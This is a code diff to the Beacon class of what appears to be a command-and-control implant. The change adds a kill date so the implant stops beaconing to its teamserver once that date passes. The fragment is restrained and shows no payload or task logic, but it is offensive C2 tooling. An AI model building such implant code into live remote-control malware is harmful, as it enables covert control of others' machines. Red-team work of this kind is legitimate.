@@ -21,8 +21,9 @@ namespace Rod.Implant.Internal;
 /// <summary>
 /// Runs the implant's check-in lifecycle against the teamserver: dial the mTLS
 /// endpoint, complete the handshake, then loop dispatching downstream tasks and
-/// reporting upstream results. Blocks until the cancellation token fires. The
-/// cadence follows the baked-in sleep + jitter profile.
+/// reporting upstream results. Blocks until the cancellation token fires or the
+/// baked-in kill date passes. The cadence follows the baked-in sleep + jitter
+/// profile.
 /// </summary>
 internal sealed class Beacon
 {
@@ -38,11 +39,13 @@ internal sealed class Beacon
     private readonly IReadOnlyList<X509Certificate2> _cas;
     private readonly TimeSpan _sleep;
     private readonly TimeSpan _jitter;
+    private readonly DateTimeOffset? _killDate;
     private readonly Runner _runner;
     private readonly TextWriter _log;
 
     public Beacon(string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
-        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, TextWriter log)
+        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
+        TextWriter log)
     {
         _beaconUrl = beaconUrl;
         _implantId = implantId;
@@ -51,19 +54,28 @@ internal sealed class Beacon
         _cas = cas;
         _sleep = sleep;
         _jitter = jitter;
+        _killDate = killDate;
         _runner = new Runner();
         _log = log;
     }
 
     /// <summary>
-    /// Blocks until cancellation. Reconnects after a jittered sleep when the
-    /// stream drops (implants are connection initiators; flapping is expected and
-    /// handled by reconnecting, architecture.md Sec 8).
+    /// Blocks until cancellation or the kill date passing. Reconnects after a
+    /// jittered sleep when the stream drops (implants are connection initiators;
+    /// flapping is expected and handled by reconnecting, architecture.md Sec 8).
+    /// The kill date is checked at the top of each cycle so a long-running implant
+    /// self-terminates once it passes, not only on the next restart
+    /// (architecture.md Sec 7).
     /// </summary>
     public async Task RunAsync(CancellationToken cancellationToken)
     {
         while (!cancellationToken.IsCancellationRequested)
         {
+            if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
+            {
+                _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
+                return;
+            }
             try
             {
                 await RunOnceAsync(cancellationToken);
